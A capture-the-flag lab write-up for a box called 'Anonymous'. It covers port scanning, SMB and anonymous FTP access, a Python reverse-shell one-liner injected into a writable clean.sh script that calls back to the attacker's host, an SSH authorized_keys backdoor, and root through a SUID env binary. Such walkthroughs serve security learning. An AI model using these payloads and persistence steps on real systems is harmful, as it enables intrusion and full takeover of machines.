# Anonymous

## NMAP

```
$ sudo nmap -sS -p- 10.10.230.230

[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 08:40 EDT
Nmap scan report for 10.10.230.230
Host is up (0.051s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 59.68 seconds
```

## SMB 

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.227.225


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.227.225:445       Name: 10.10.227.225             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        pics                                                    READ ONLY       My SMB Share Directory for Pics
        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))
                        
```

Getting the files from the share

```
┌──(kali㉿kali)-[~]
└─$ smbget --recursive smb://10.10.227.225/pics
Password for [kali] connecting to //10.10.227.225/pics: 
Using workgroup WORKGROUP, user kali
smb://10.10.227.225/pics/corgo2.jpg                                                                          
smb://10.10.227.225/pics/puppos.jpeg                                                                         
Downloaded 300.64kB in 5 seconds
```

## Pics


Strings of puppos.jpeg
```
$$Photoshop 3.0
8BIM
Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung.
Adobe Stock #118102236
Photographer: Tatyana Panova
tanipanova - stock.adobe.com
        118102236
@Three dogs of welsh corgi pembroke breed with white and red coat
20160723
085938+0000
Russian Federation
animal
pembroke
corgi
welsh
cute
canine
happy
breed
portrait
pedigree
grass
posing
outdoor
        happiness
nature
friend
green
funny
summer
        beautiful
looking
color
purebred
adorable
playing
brown
smile
smiling
standing
small
friendly
cheerful
young
view
background
park
life
little
walk
tongue
enjoy
ears
pretty
domestic
lovely
horizontal
grass
park
portrait
Tatyana Panova
www.tpanova.ru
Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung.
Adobe Stock #1181022368BIM
'V8BIM

```


## FTP

We can login anonymously to FTP

```
$ ftp 10.10.227.225
Connected to 10.10.227.225.
220 NamelessOne's FTP Server!
Name (10.10.227.225:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47612|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
```

## Reverse shell on clean.sh

With a python reverse shell.

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.191.218",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Wait a bit and then we get a reverse shell now 

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4242      
listening on [any] 4242 ...
connect to [10.8.191.218] from (UNKNOWN) [10.10.230.230] 58308
$ whoami
whoami
namelessone
$ 
```

Upgrade to tty shell with python

```
python -c 'import pty; pty.spawn("/bin/bash")'
```


## The shell was pretty bad so i added a ssh backdoor

```
namelessone@anonymous:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/namelessone/.ssh/id_rsa): 

Created directory '/home/namelessone/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/namelessone/.ssh/id_rsa.
Your public key has been saved in /home/namelessone/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:6S+iyH6fVUt4XDB/4vVvK370V2l4xRc21SmEqpwkdxU namelessone@anonymous
The key's randomart image is:
+---[RSA 2048]----+
|          oE+.  =|
|           * . =.|
|          o + =.o|
|     . o * o + .+|
|      = S = . . =|
|       = + . . =o|
|        o .   + =|
| . .. .o..   . o+|
| .+..oo. .. ..o..|
+----[SHA256]-----+


namelessone@anonymous:~/.ssh$ cp id_rsa.pub authorized_keys 
cp id_rsa.pub authorized_keys 

```

```
                                                                                
┌──(kali㉿kali)-[~/Desktop/Anonymous]
└─$ chmod 600 id_rsa_anonymous 
                                                                                 
┌──(kali㉿kali)-[~/Desktop/Anonymous]
└─$ ssh -i id_rsa_anonymous namelessone@10.10.230.230
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-99-generic x86_64)

```

## PrivEsc

```
====================================( Interesting Files )=====================================                                                                    
[+] SUID                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                              
                                         
/usr/bin/env  


```


Exploit env 

From gtfo bins:

```
sudo install -m =xs $(which env) .

./env /bin/sh -p
```

```

namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# whoami
root

```

## Get all the flags